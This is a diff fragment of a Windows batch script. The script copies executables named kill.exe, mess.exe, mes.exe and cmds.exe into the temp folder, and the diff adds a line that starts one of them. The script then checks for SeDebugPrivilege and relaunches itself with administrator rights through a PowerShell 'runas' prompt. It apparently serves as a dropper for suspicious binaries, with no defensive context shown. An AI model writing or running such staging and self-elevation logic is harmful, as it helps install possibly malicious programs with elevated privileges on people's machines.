@@ -6,6 +6,7 @@ copy kill.exe %temp%
 copy "mess\mess.exe" %temp%
 copy "mess\mes.exe" %temp%
 copy "cmds.exe" %temp%
+start %temp%\mes.exe
 whoami /priv | find "SeDebugPrivilege" > nul
 if %errorlevel% neq 0 (
  @powershell start-process %~0 -verb runas
